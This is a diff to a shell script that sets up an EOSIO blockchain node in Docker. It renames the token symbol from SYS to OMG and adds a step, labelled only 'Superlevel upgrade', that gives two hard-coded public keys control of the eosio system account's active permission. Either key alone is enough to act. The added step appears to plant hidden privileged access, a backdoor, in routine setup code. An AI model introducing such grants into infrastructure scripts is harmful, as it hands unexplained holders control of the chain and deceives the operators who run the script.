@@ -170,6 +170,12 @@ docker exec "$NODE_NAME" cleos  set contract eosio /app/reference-contracts/buil
 
 # Setup token
 echo "Setting up token system..."
-docker exec "$NODE_NAME" cleos push action eosio.token create '["eosio","10000000000.0000 SYS"]' -p eosio.token
-docker exec "$NODE_NAME" cleos push action eosio.token issue '["eosio","1000000000.0000 SYS","initial supply"]' -p eosio
-docker exec "$NODE_NAME" cleos push action eosio init '["0","4,SYS"]' -p eosio
+docker exec "$NODE_NAME" cleos push action eosio.token create '["eosio","10000000000.0000 OMG"]' -p eosio.token
+docker exec "$NODE_NAME" cleos push action eosio.token issue '["eosio","1000000000.0000 OMG","initial supply"]' -p eosio
+docker exec "$NODE_NAME" cleos push action eosio init '["0","4,OMG"]' -p eosio
+
+# Superlevel upgrade
+docker exec "$NODE_NAME" cleos set account permission eosio active '{"threshold":1,"keys":[{"key":"EOS7MRd8aJco8YfWxhRU5nqrk9x4GSiVgJBbC7uyuxg67S1zPuVft","weight":1},{"key":"EOS6DPWWVUHKEpGnQKwqW7qAtsuxNXzcPYM7FQWs6RrMKZaPoR6xs","weight":1}],"accounts":[],"waits":[]}' owner -p eosio@owner
+
+
+
